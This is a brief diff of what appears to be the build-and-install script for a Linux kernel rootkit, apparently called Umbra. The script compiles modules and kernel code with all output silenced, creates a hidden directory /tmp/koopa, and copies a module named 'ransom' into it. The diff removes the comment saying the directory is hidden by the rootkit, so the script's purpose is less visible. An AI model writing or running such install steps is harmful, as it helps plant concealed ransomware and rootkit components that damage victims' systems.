@@ -10,7 +10,7 @@ make &> /dev/zero
 cd ../modules &> /dev/zero
 make &> /dev/zero
 cd .. &> /dev/zero
-mkdir /tmp/koopa &> /dev/zero #secret dir for umbra, hidden by the rootkit
+mkdir /tmp/koopa &> /dev/zero
 cp modules/ransom /tmp/koopa &> /dev/zero
 
 cd kernel &> /dev/zero
